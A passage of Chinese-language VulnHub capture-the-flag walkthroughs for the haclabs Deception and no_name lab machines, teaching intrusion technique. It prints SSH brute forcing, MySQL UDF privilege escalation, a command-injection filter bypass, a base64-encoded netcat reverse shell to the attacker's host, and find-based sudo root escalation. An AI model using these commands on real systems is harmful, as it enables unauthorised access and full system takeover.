http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;</span><br><span class="line"></span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;index.php (CODE:301|SIZE:0)                                                                               </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F;robots.txt (CODE:200|SIZE:22)</span><br></pre></td></tr></table></figure><p>wordpres框架内的链接指向的主机为localhost，需要将文件<code>/etc/hosts</code>中的<code>127.0.0.1 localhost</code>这一行注释，再写入<code>192.168.31.207 localhost</code>，使用firefox即可正常访问</p><h2 id="漏洞利用-12"><a class="markdownIt-Anchor" href="#漏洞利用-12"></a> 漏洞利用</h2><p>访问<code>/wordpress/robots.txt</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow : &#x2F;robots.html</span><br></pre></td></tr></table></figure><p>访问<code>/wordpress/robots.html</code><br />分析js得知点击&quot;show quest&quot;15次之后会跳转至&quot;admindelete.html&quot;</p><p>访问<code>/wordpress/admindelete.html</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOL,A Noob is looking for a hint</span><br></pre></td></tr></table></figure><p>访问<code>/wordpress/himt.html</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please collect all the API tokens availabe on the home page</span><br></pre></td></tr></table></figure><p>在页面<code>/</code>收集到四段API Token</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">API old0 : 5F4DCC3B5AA</span><br><span class="line">API old1 : 765D61D8</span><br><span class="line">API old2 : 327DEB</span><br><span class="line">API new : 882CF99</span><br></pre></td></tr></table></figure><p>整理这些API</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat pass </span><br><span class="line"></span><br><span class="line">5F4DCC3B5AA</span><br><span class="line">765D61D8</span><br><span class="line">327DEB</span><br><span class="line">882CF99</span><br><span class="line">5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure><p>枚举wordpress框架的用户名/插件/主题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.31.207&#x2F;wordpress&#x2F; -e u ap at</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] haclabs</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] yash</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>未发现关于插件与主题的有效信息</p><p>整理得到用户名字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat user</span><br><span class="line">yash</span><br><span class="line">haclabs</span><br></pre></td></tr></table></figure><p>将其用作口令字典来爆破wordpress登录框，失败</p><p>将其用作口令字典来爆破ssh服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydea -I -L user -P pass ssh:&#x2F;&#x2F;192.168.31.207</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.31.207   login: yash   password: 5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure><p>得到ssh服务的账户</p><h2 id="权限提升-12"><a class="markdownIt-Anchor" href="#权限提升-12"></a> 权限提升</h2><p>登入ssh服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh yash@192.168.31.207</span><br><span class="line">5F4DCC3B5AA765D61D8327DEB882CF99</span><br></pre></td></tr></table></figure><p>在目录<code>/home/yash</code>下发现隐藏文件<code>.systemlogs</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat .systemlogs </span><br><span class="line"></span><br><span class="line">ssdsdsdsdsdqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklqwertyuiop1234567890qazxdswedcfrfgvbhyyhnkiollokmkijnjuyhbhytgvfrdcxdesxzsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklzaq123456vfr4567890mnbvcde4567890yuiopasdfghjklzxcvbnmzxcvbnmasdfghjklmnbvcxzsaq234567890-098765rewsxcvbnm,lpoiuytresxcbnmkoiuytredcyuiopasdfghjklzxcvbnmzxcvbnmasdfghjk!@#$dfkdfjdkfjdf!@#$fdjferheirdfdfksdjhfsg24356789yuiopasdfghjklzxcvbnmzxcvbnmasdfghjkljdfivnd&quot;haclabs&quot;jsdskdjskdjsldsklfjlkfdgl&#x2F;dsfgkdhfgkdfgdjfhkagdhkdhgkkdzfkgdhfffgkhsfhgkdfhgkjlsfladjsflslfjlaaakjdflkaejflyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklNDmsfmbwebrm43564576nu4r50q824305485103601856035860020^&amp;*()sdjfsdflsdfaldjfleragkrjgkfdghdfhksjdhgsghkskskfskgkshkshksfhkgkrtho43euvnd,m,mnhjkjhgfdrtfghj,;poiuytgbvftyhjkllksjhgdfrteuyue&quot;A&#x3D;123456789&quot;fdsgfhndsffjladjksfjlsdfjlfghfieruyiehgkfnjuyhbvcftyu789876543wsxcvbnm,mju76543asxcferfgbnm,klokjhgbvcxsdfklsdfweri34o58uwotueagsdgjlyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklwlarqlewairp3wi4te0596q03496tiquieljkgrelrsjto5euyjgeldfhqowe5uy4seyjelsdglsoh45yeujhskehgesjhgsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldsklflssldfjlsdfjsldfjsldfjld&quot;+A[::-1]&quot;fjlsdnvsldvnsujnhgfqwertyuioplkjhgfdsazxcvbnm,mnbvcxzasdfghjkl;poiuytrewqazxsedcvftghnklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldjfkdslfjsldfjsldfjlw4o32894829348293489289389</span><br></pre></td></tr></table></figure><p>可以看到有三段内容用引号标识</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;haclabs&quot;</span><br><span class="line">&quot;A&#x3D;123456789&quot;</span><br><span class="line">&quot;+A[::-1]&quot;</span><br></pre></td></tr></table></figure><p>尝试后得出账户haclabs的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su haclabs</span><br><span class="line">haclabs987654321</span><br></pre></td></tr></table></figure><p>切换至账户haclabs</p><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">haclabs987654321</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for haclabs on haclabs:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User haclabs may run the following commands on haclabs:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure><p>sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),27(sudo)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>Mysql UDF提权</p></blockquote><p>拿到yash账户后提权遇到瓶颈，上传了脚本linuxprivchecker，运行过后报告可能存在Mysql的UDF提权的可能<br />查阅了相关资料之后发现几个问题</p><ul><li>需要root账户</li><li>secure_file_priv</li><li>plugin_dir</li></ul><p>可以先在wordpress的配置文件中获取账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress&#x2F;wp-config.php</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ** MySQL settings - You can get this info from your web host ** &#x2F;&#x2F;</span><br><span class="line">&#x2F;** The name of the database for WordPress *&#x2F;</span><br><span class="line">define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database username *&#x2F;</span><br><span class="line">define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database password *&#x2F;</span><br><span class="line">define( &#39;DB_PASSWORD&#39;, &#39;cry4moon&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL hostname *&#x2F;</span><br><span class="line">define( &#39;DB_HOST&#39;, &#39;localhost&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** Database Charset to use in creating database tables. *&#x2F;</span><br><span class="line">define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;** The Database Collate type. Don&#39;t change this if in doubt. *&#x2F;</span><br><span class="line">define( &#39;DB_COLLATE&#39;, &#39;&#39; );</span><br></pre></td></tr></table></figure><p>拿到账户之后再使用mysql客户端登入服务<br /><code>mysql -h localhost -u wordpressuser -pcry4moon</code><br />再查看root账户的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select host,user,authentication_string from mysql.user;</span><br><span class="line">+---------------+------------------+-------------------------------------------+</span><br><span class="line">| host          | user             | authentication_string                     |</span><br><span class="line">+---------------+------------------+-------------------------------------------+</span><br><span class="line">| localhost     | root             | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| localhost     | mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">| localhost     | mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">| localhost     | debian-sys-maint | *2A702E4018EF99C245B5DC4E753531720BDC94E0 |</span><br><span class="line">| %             | haclabs          | *1565CEE976A27D283F4ECF1EC2AEE11E71C8D208 |</span><br><span class="line">| localhost     | phpmyadmin       | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| wordpressuser | wordpress        | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| localhost     | wordpress        | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">| localhost     | wordpressuser    | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |</span><br><span class="line">+---------------+------------------+-------------------------------------------+</span><br><span class="line">9 rows in set (0.20 sec)</span><br></pre></td></tr></table></figure><p>可以看到localhost账户的密码hash和wordpressuser的一样，即都是<code>cry4moon</code><br />但是无法登入，测试时重新设置了密码，操作如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update mysql.user set authentication_string&#x3D;PASSWORD(&quot;cry4moon&quot;) where user&#x3D;&#39;root&#39;;</span><br><span class="line">update mysql.user set plugin&#x3D;&quot;mysql_native_password&quot;;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><p>完成更改密码之后即可以root账户登入</p><p>而UDF提权则需要在插件目录写入文件，关于目录可以用以下命令查阅</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;plugin_dir&#39;;</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| Variable_name | Value                  |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| plugin_dir    | &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F; |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">1 row in set (0.07 sec)</span><br></pre></td></tr></table></figure><p>即<code>/usr/lib/mysql/plugin/</code></p><p>而在写入文件时会发生错误，原因是<code>secure_file_priv</code>参数对于文件写入存在限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">| Variable_name    | Value                 |</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">| secure_file_priv | &#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F; |</span><br><span class="line">+------------------+-----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>即只能写入目录<code>/var/lib/mysql-files/</code>，子目录下也不行</p><ul><li>若该值为空，则无限制</li><li>若该值为NULL，则不可写入</li></ul><p>提权需要将文件作为插件写入plugin_dir，但与参数<code>secure_file_priv</code>冲突，故写入时会报错。而参数<code>secure_file_priv</code>为只读参数，不能再mysql客户端中更改，只能修改mysqld.cnf，写入&quot;secure_file_priv=&quot;，并且重启mysql服务，才能继续进行UDF提权。</p><p>之后发生玄学运维，手动修改了secure_file_priv参数，权限777的路径写入文件会报错权限否认，手动移动的so文件可以载入但是不能执行命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#39;&#x2F;tmp&#x2F;udf.so&#39;));</span><br><span class="line">select * from foo into dumpfile &#39;%plugin_dir%&#x2F;udf.so&#39;;</span><br><span class="line">create function sys_eval returns string soname &#39;udf2.so&#39;;</span><br><span class="line">select sys_eval(&#39;id&#39;);</span><br></pre></td></tr></table></figure><p>linux下的so文件与windows下的dll文件在MSF中都有附带</p><p>参考资料</p><blockquote><p><a href="https://www.hacknos.com/haclabs-deception-walkthrough-vulnhub/">WP</a><br /><a href="https://blog.csdn.net/qq_36119192/article/details/84863268">UDF</a><br /><a href="https://www.cnblogs.com/mrhonest/p/10836621.html">UDF</a><br /><a href="https://www.cnblogs.com/Tdazheng/p/10742929.html">Mysql.pass</a></p></blockquote><hr /><h1 id="no_name"><a class="markdownIt-Anchor" href="#no_name"></a> <a href="https://www.vulnhub.com/entry/haclabs-no_name,429/">no_name</a></h1><p><code>2020/03/27 01:05:37</code></p><h2 id="端口扫描-13"><a class="markdownIt-Anchor" href="#端口扫描-13"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -T5 -sV -A -n -v 192.168.31.196</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.196</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 78:2b:f7:57:bf:da:fd:ec:e0:d5:60:c4:8b:53:62:fd (RSA)</span><br><span class="line">|   256 36:82:4a:8b:71:f7:78:da:49:42:f9:88:6d:26:73:6a (ECDSA)</span><br><span class="line">|_  256 dc:18:8e:b3:36:53:cb:10:34:98:57:3d:f0:a1:2b:ad (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&#39;t have a title (text&#x2F;html; charset&#x3D;UTF-8).</span><br><span class="line">MAC Address: 08:00:27:59:63:EF (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 18.412 days (since Sun Mar  8 03:06:40 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;261 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-13"><a class="markdownIt-Anchor" href="#web路径枚举-13"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.196/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.196&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.196&#x2F;admin (CODE:200|SIZE:417)                                            </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.196&#x2F;index.php (CODE:200|SIZE:201)                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.196&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure><p>访问<code>/index.php</code></p><ul><li>显示<code>Fake Admin Area</code></li><li>任意提交查询则回显<code>Fake ping executed</code></li></ul><p>访问<code>/admin</code></p><ul><li>有四个图片文件</li><li>源代码中有提示信息<code>passphrase:harder</code></li></ul><h2 id="漏洞利用-13"><a class="markdownIt-Anchor" href="#漏洞利用-13"></a> 漏洞利用</h2><p>使用<code>steghide</code>工具进行分析<br />发现图片文件<code>haclabs.jpeg</code>存在隐写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf haclabs.jpeg  -p harder</span><br><span class="line">wrote extracted data to &quot;imp.txt&quot;.</span><br><span class="line">cat imp.txt </span><br><span class="line">c3VwZXJhZG1pbi5waHA&#x3D;</span><br><span class="line">echo &quot;c3VwZXJhZG1pbi5waHA&#x3D;&quot; | base64 -d</span><br><span class="line">superadmin.php</span><br></pre></td></tr></table></figure><p>访问<code>/superadmin.php</code></p><ul><li>存在ping功能</li></ul><p>尝试进行命令注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">| cat superadmin.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">   if (isset($_POST[&#39;submitt&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">   $word&#x3D;array(&quot;;&quot;,&quot;&amp;&amp;&quot;,&quot;&#x2F;&quot;,&quot;bin&quot;,&quot;&amp;&quot;,&quot; &amp;&amp;&quot;,&quot;ls&quot;,&quot;nc&quot;,&quot;dir&quot;,&quot;pwd&quot;);</span><br><span class="line">   $pinged&#x3D;$_POST[&#39;pinger&#39;];</span><br><span class="line">   $newStr &#x3D; str_replace($word, &quot;&quot;, $pinged);</span><br><span class="line">   if(strcmp($pinged, $newStr) &#x3D;&#x3D; 0)</span><br><span class="line">&#123;</span><br><span class="line">    $flag&#x3D;1;</span><br><span class="line">&#125;</span><br><span class="line">       else</span><br><span class="line">&#123;</span><br><span class="line">   $flag&#x3D;0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($flag&#x3D;&#x3D;1)&#123;</span><br><span class="line">$outer&#x3D;shell_exec(&quot;ping -c 3 $pinged&quot;);</span><br><span class="line">echo &quot;$outer&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>有两种获取shell的方法</p><ul><li>使用wget下载php一句话木马</li><li>使用nc反弹shell</li></ul><p>过滤可以使用base64编码进行绕过<br /><code>|echo &quot;xxxx&quot;|base64 -d|bash</code><br />xxxx即为要执行的命令的base64编码的结果</p><p><strong>wget</strong><br />写入文件失败，可能没有权限</p><p><strong>nc</strong></p><p>监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9900</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc.traditional -e &#x2F;bin&#x2F;bash 192.168.31.10 9900&quot; | base64</span><br><span class="line">bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMzEuMTAgOTkwMAo&#x3D;</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|echo &quot;bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMzEuMTAgOTkwMAo&#x3D;&quot;|base64 -d|bash</span><br></pre></td></tr></table></figure><p>接收到反弹shell</p><h2 id="权限提升-13"><a class="markdownIt-Anchor" href="#权限提升-13"></a> 权限提升</h2><p>获取pty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>在yash的home目录发现flag1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;yash&#x2F;flag1.txt</span><br><span class="line">Due to some security issues,I have saved haclabs password in a hidden file.</span><br></pre></td></tr></table></figure><p>搜索拥有者为yash的文件/文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user yash 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;home&#x2F;yash</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;flag1.txt</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.bashrc</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.cache</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.cache&#x2F;motd.legal-displayed</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.profile</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.bash_history</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.gnupg</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.gnupg&#x2F;private-keys-v1.d</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.local</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.local&#x2F;share</span><br><span class="line">&#x2F;home&#x2F;yash&#x2F;.local&#x2F;share&#x2F;nano</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;hidden</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;hidden&#x2F;.passwd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;usr&#x2F;share&#x2F;hidden&#x2F;.passwd</span><br><span class="line">haclabs1234</span><br></pre></td></tr></table></figure><p>切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su haclabs</span><br><span class="line">haclabs1234</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for haclabs on haclabs:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User haclabs may run the following commands on haclabs:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;find</span><br></pre></td></tr></table></figure><p>可以使用find命令进行提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root find &#x2F;etc&#x2F;passwd -exec passwd root \;</span><br><span class="line">hackforfun</span><br><span class="line">hackforfun</span><br><span class="line">su root</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>SUID-find</p></blockquote><p>其实在<code>www-data</code>权限时就可以使用find命令进行操作</p><p>查看SUID</p><figure class="highlight 